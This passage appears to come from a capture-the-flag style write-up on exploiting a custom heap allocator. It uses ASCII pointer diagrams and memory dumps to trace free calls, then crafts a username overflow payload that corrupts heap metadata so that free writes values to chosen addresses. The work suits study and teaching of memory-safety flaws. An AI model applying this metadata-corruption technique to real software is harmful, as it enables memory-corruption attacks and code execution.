┌────────┬────────┬────────┬──────────────────────────┐
│  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
└────────┴────────┴────────┴──────────────────────────┘
</code></pre>

<p>The visualization below depicts the pointer structure.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<h3>Runtime Analysis</h3>
<h4>First Free Call</h4>

<p>Observe what happens when the <code>login</code> function passes a password buffer pointer to <code>free</code>. The highlighted memory location is in <code>R15</code>.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ <mark>bbbb</mark> 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The data structure is then modified as follows.</p>

<br>
<div id="slides">
  <section id="diagram-free-1-step-1">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  <mark>0021</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-1-step-2">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  <mark>0020</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-1-step-3">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  <mark>1fc2</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-1-step-4">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │ ┌─────────────────────────────────────────────────┐
│      │ │ │                                                 │
│ ┌──┐ │ │ │                                                 │
│ │  ▼ ▼ ▼ ▼                                                 │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           │                                         │
│ │                │                                         │
│ │    ┌───────────┘                                         │
│ │    ▼                                                     │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  <mark>2408</mark>  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#diagram-free-1-step-1">01</a></li>
  <li><a href="#diagram-free-1-step-2">02</a></li>
  <li><a href="#diagram-free-1-step-3">03</a></li>
  <li><a href="#diagram-free-1-step-4">04</a></li>
</ul>


<h4>Second Free Call</h4>
<p>The second <code>free</code> call takes a pointer to the username buffer, also passed in <code>R15</code>.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │ ┌─────────────────────────────────────────────────┐
│      │ │ │                                                 │
│ ┌──┐ │ │ │                                                 │
│ │  ▼ ▼ ▼ ▼                                                 │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  241e  │  0021  │ <mark>aaaa</mark> 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           │                                         │
│ │                │                                         │
│ │    ┌───────────┘                                         │
│ │    ▼                                                     │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The data structure is then modified as follows.</p>

<br>
<div id="slides">
  <section id="diagram-free-2-step-1">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │ ┌─────────────────────────────────────────────────┐
│      │ │ │                                                 │
│ ┌──┐ │ │ │                                                 │
│ │  ▼ ▼ ▼ ▼                                                 │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  241e  │  <mark>0021</mark>  │ aaaa 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           │                                         │
│ │                │                                         │
│ │    ┌───────────┘                                         │
│ │    ▼                                                     │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-2-step-2">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │ ┌─────────────────────────────────────────────────┐
│      │ │ │                                                 │
│ ┌──┐ │ │ │                                                 │
│ │  ▼ ▼ ▼ ▼                                                 │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  241e  │  <mark>0020</mark>  │ aaaa 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           │                                         │
│ │                │                                         │
│ │    ┌───────────┘                                         │
│ │    ▼                                                     │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-2-step-3">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │ ┌─────────────────────────────────────────────────┐
│      │ │ │                                                 │
│ ┌──┐ │ │ │                                                 │
│ │  ▼ ▼ ▼ ▼                                                 │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  241e  │  <mark>0046</mark>  │ aaaa 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           │                                         │
│ │                │                                         │
│ │    ┌───────────┘                                         │
│ │    ▼                                                     │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-2-step-4">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │ ┌─────────────────────────────────────────────────┐
│      │ │ │                                                 │
│ ┌──┐ │ │ │                                                 │
│ │  ▼ ▼ ▼ ▼                                                 │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  241e  │  <mark>200e</mark>  │ aaaa 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           │                                         │
│ │                │                                         │
│ │    ┌───────────┘                                         │
│ │    ▼                                                     │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-2-step-5">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └───┬────┴────────┴────────┴──────┘
        │
┌─────┐ │ ┌──────────────────────────────────────────────────┐
│     │ │ │                                                  │
│ ┌─┐ │ │ │ ┌──────┐                                         │
│ │ ▼ ▼ ▼ ▼ ▼      │                                         │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  <mark>2408</mark>  │  200e  │ aaaa 0000 0000 0000 .... │  │
│   └────────┴────────┴────────┴──────────────────────────┘  │
│      ▲                                                     │
│ ┌────┘                                                     │
│ │                                                          │
│ │                                                          │
│ │                                                          │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐  │
│ └─┤  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │  │
│   └────────┴─────┬──┴────────┴──────────────────────────┘  │
│      ▲           │                                         │
│ ┌────┘           └─────────────────────────────────────────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#diagram-free-2-step-1">01</a></li>
  <li><a href="#diagram-free-2-step-2">02</a></li>
  <li><a href="#diagram-free-2-step-3">03</a></li>
  <li><a href="#diagram-free-2-step-4">04</a></li>
  <li><a href="#diagram-free-2-step-5">05</a></li>
</ul>

<h3>Flipping Bits</h3>
<p>Recall that the username read has a 32-byte buffer overflow. Supplying 48 bytes of the non-printing character 0xAA results in memory corruption.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ <mark>aaaa aaaa aaaa aaaa ....</mark> │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>aaaa</mark>  │  <mark>aaaa</mark>  │  <mark>aaaa</mark>  │ <mark>aaaa aaaa aaaa aaaa ....</mark> │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>aaaa</mark>  │  <mark>aaaa</mark>  │  <mark>aaaa</mark>  │ <mark>aaaa aaaa</mark> 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>Consider a case where the attacker sets the least significant byte of the first overflowed word to a higher value. The initial value of this byte is as follows.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  24<mark>08</mark>  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>It is unclear what the algorithm is doing, so a minor alteration is initially preferable. There may be checks to see whether the value is within some range, so change the pointer to a nearby address. Consider what happens when setting the first word to a value within 256 bytes of the original location. Sending the following payload as the username accomplishes this.</p>

<h5>Username:</h5>

<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>90</mark>24 3424 2100</pre></code>

<p>The value of the first overflowed word is now <code>0x2490</code>. Raw memory before the <code>free</code> call is as follows.</p>

<div id="slides">
  <section id="memory-before-payload-read">
	  <pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420: 3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
  <section id="memory-after-username-payload-read">
	  <pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>90</mark>24   ...............$
2420: 3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

  </section>
  <section id="memory-after-password-payload-read">
	  <pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa 9024   ...............$
2420: 3424 2100 <mark>bbbb 00</mark>00 0000 0000 0000 0000   4$!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#memory-before-payload-read">Before Read</a></li>
  <li><a href="#memory-after-username-payload-read">Username</a></li>
  <li><a href="#memory-after-password-payload-read">Password</a></li>
</ul>

<p>The memory is as follows before and after the call to <code>free</code>.</p>

<br>
<div id="slides">
  <section id="payload-memory-before-free-1">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa 9024   ...............$
2420: 3424 2100 bbbb 0000 0000 0000 0000 0000   4$!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
2450: *  
</code></pre>
  </section>
  <section id="payload-memory-after-free-1">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa 9024   ...............$
2420: 3424 <mark>20</mark>00 bbbb 0000 0000 0000 0000 0000   4$ .............
2430: 0000 0000 <mark>90</mark>24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
2450: *  
2490: 0000 <mark>0824 c81f</mark> 0000 0000 0000 0000 0000   ...$............
24a0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#payload-memory-before-free-1">Before Free</a></li>
  <li><a href="#payload-memory-after-free-1">After Free</a></li>
</ul>

<p>The algorithm writes two values of unknown provenance to addresses <code>0x2492</code> and <code>0x2494</code> after the corruption of a single byte.</p>

<h2>Differential Runtime Analysis</h2>

<p>Observe the pointers during the course of the <code>free</code> call.</p>

<br>
<div id="slides">
  <section id="diagram-free-modified-1-step-1">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  <mark>0021</mark>  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│ ┌────┘           │                                          │
│ │                │                                          │
│ │    ┌───────────┘                                          │
│ │    │                                                      │
│ │    │                                                      │
│ │    ▼                                                      │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
└──────────────────┘                                          │
                                                              │
                                                              │
                                                              │
                  ┌───────────────────────────────────────────┘
                  │
                  │
                  ▼
    ┌────────┬────────┬────────┬────────┬────────┐
    │DATA    │  0000  │  0000  │  0000  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘


</code></pre>
  </section>
  <section id="diagram-free-modified-1-step-2">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  <mark>0020</mark>  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│ ┌────┘           │                                          │
│ │                │                                          │
│ │    ┌───────────┘                                          │
│ │    │                                                      │
│ │    │                                                      │
│ │    ▼                                                      │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
└──────────────────┘                                          │
                                                              │
                                                              │
                                                              │
                  ┌───────────────────────────────────────────┘
                  │
                  │
                  ▼
    ┌────────┬────────┬────────┬────────┬────────┐
    │DATA    │  0000  │  0000  │  0000  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘


</code></pre>
  </section>
  <section id="diagram-free-modified-1-step-3">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│ ┌────┘           │                                          │
│ │                │                                          │
│ │    ┌───────────┘                                          │
│ │    │                                                      │
│ │    │                                                      │
│ │    ▼                                                      │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
└──────────────────┘                                          │
                                                              │
                                                              │
                                                              │
                  ┌───────────────────────────────────────────┘
                  │
                  │
                  ▼
    ┌────────┬────────┬────────┬────────┬────────┐
    │DATA    │  0000  │  0000  │  <mark>0026</mark>  │  ....  │
    ├────────┼────────┼────────┼────────┼────────┤
    │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │
    └────────┴────────┴────────┴────────┴────────┘


</code></pre>
  </section>
  <section id="diagram-free-modified-1-step-4">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│ ┌────┘           │                                          │
│ │                │                                          │
│ │    ┌───────────┘                                          │
│ │    │                                                      │
│ │    │                                                      │
│ │    ▼                                                      │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐   │
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│      ▲           │                                          │
│      │           │                                          │
└──────┼───────────┘                                          │
       │                                                      │
  ┌────┘                                                      │
  │                                                           │
  │               ┌───────────────────────────────────────────┘
  │               │
  │               │         ┌──────────────────────┐
  │               ▼         │                      │
  │ ┌────────┬────────┬─────┴──┬────────┬────────┐ │
  │ │DATA    │  0000  │  <mark>2434</mark>  │  0026  │  ....  │ │
  │ ├────────┼────────┼────────┼────────┼────────┤ │
  │ │ADDRESS │ 0x2490 │ 0x2492 │ 0x2494 │  ....  │ │
  │ └────────┴────────┴────────┴────────┴────────┘ │
  │                                                │
  └────────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="diagram-free-modified-1-step-5">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa aaaa aaaa aaaa .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│      ┌───────────┘
│      │
│      │  ┌───────────────────────────────────────────────────┐
│      ▼  │                                                   │
│   ┌─────┴──┬────────┬────────┬──────────────────────────┐   │
│   │  2490  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │   │
│   └────────┴─────┬──┴────────┴──────────────────────────┘   │
│                  │                                          │
│                  │                                          │
│                  │                                          │
│      ┌───────────┘                                          │
│      │                                                      │
│      │ ┌──────────────────────────────────────────────────┐ │
│      ▼ │                                                  │ │
│   ┌────┴───┬────────┬────────┬──────────────────────────┐ │ │
